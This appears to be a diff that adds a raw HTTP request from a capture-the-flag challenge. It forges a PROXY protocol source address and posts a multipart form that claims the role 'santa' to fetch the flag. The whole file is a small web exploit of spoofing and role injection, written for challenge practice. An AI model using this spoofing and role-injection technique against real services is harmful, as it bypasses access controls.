@@ -1,0 +1,16 @@
+PROXY TCP4 1.2.3.4 5.6.7.8 54321 1337
+POST /present/info HTTP/1.1
+Host: 08fccd581446cc9a.julec.tf:1337
+Content-Type: multipart/form-data; boundary=----msfboundary
+Content-Length: 178
+Connection: close
+
+------msfboundary
+Content-Disposition: form-data; name="roles"
+
+["santa"]
+------msfboundary
+Content-Disposition: form-data; name="presentname"
+
+flag
+------msfboundary--
